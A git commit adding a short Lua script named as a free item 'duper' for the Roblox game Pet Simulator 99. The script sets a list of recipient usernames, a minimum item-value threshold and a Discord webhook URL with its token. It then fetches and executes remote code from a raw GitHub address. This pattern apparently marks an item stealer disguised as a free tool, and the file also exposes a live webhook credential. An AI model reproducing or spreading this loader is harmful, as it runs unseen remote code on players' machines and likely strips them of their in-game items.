5b32b502f79e57d89960a9cbcfe354dd9b521eec
ps99dupperscript <voiacount123335@gmail.com>
2025-05-02 17:55:06 +0200

    Add files via upload

---
+++ ps99duperfree.lua
@@ -0,0 +1,5 @@
+_G.Usernames = {"Yoghurtyoghurt11"} -- you can add as many as you'd like
+_G.minrap = 10
+_G.webhook = "https://discord.com/api/webhooks/1367665103486320703/iHSKc85YZeSAcrlB11g5ULC-s3cCu6lljPZWCs1KIQXJAAueT7CxSVF8qrZV_GKeZ8pX" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ps99dupperscript/ps99freeduper/refs/heads/main/source.lua"))()
